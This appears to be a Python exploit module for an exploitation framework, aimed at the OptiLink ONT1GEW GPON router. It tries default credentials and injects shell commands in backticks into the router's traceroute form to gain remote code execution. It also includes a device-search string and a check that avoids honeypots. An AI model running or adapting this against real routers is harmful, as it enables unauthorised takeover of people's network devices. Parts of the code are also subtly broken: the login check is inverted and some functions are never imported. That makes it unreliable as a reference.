'''
Version: ONT1GEW V2.1.11_X101 Build.1127.190306
Exploit description: OptiLink ONT1GEW GPON 2.1.11_X101 Build 1127.190306 - Remote Code Execution (Authenticated)
exploit link: https://www.exploit-db.com/exploits/49955
services.http.response.html_title: Optilink
'''
import re

from routersploit.core.http.http_client import HTTPClient
from routersploit.core.exploit.option import OptIP, OptPort
from routersploit.core.exploit.utils import is_it_honeypot
from routersploit.core.exploit.printer import log


class Exploit(HTTPClient):
    __info__ = {'name': 'ONT1GEW_Auth_RCE'}

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def __init__(self):
        self.credentials = [("e8c", "e8c"), ("adsl", "realtek"), ("admin", "admin")]

    def auth(self) -> bool:
        match_str = "Authentication failure!|invalid username!|bad password!|you have logined error 3 consecutive times, please relogin 1 minute later!|another user have logined in"
        for cred in self.credentials:
            data = {'username': cred[0], 'psd': cred[1]}
            response = self.http_request(
                method="POST",
                path="/boaform/admin/formLogin",
                data=data
            )
            if response and re.match(match_str, response.text):
                return True
        return False

    def execute(self, cmd: str) -> str:
        log.print_debug("Trying to fetch the WAN Name...")
        response = self.http_request(method="GET", path="/diag_ping.asp")
        if not response:
            return ''
        match = re.findall(r"name=\"waninf\"><option value=\"(.*?)\">", response.text)
        if match:
            post_data = {
                'target_addr': f'"1.1.1.1 `{cmd}`"',
                'waninf': f'{match[0]}'
            }
            response = self.http_request(
                method="POST",
                path="/boaform/admin/formTracert",
                data=post_data
            )
            if response:
                return response.text
        return ''

    def check(self) -> bool:
        response = self.http_request(method='GET', path='/login.asp')
        if response and 'RES_COMPANY="Optilink"' in response.text and not is_it_honeypot(response):
            return True
        return False

    def run(self):
        if self.check():
            print_status("Target seams %s:%d is vulnerable", self.host, self.port)
            print_status('Trying to authenticate...')
            if self.auth():
                print_status('Looks like authentication was succesful!')
        else:
            print_error("Exploit failed - target %s:%d seems to be not vulnerable", self.host, self.port)
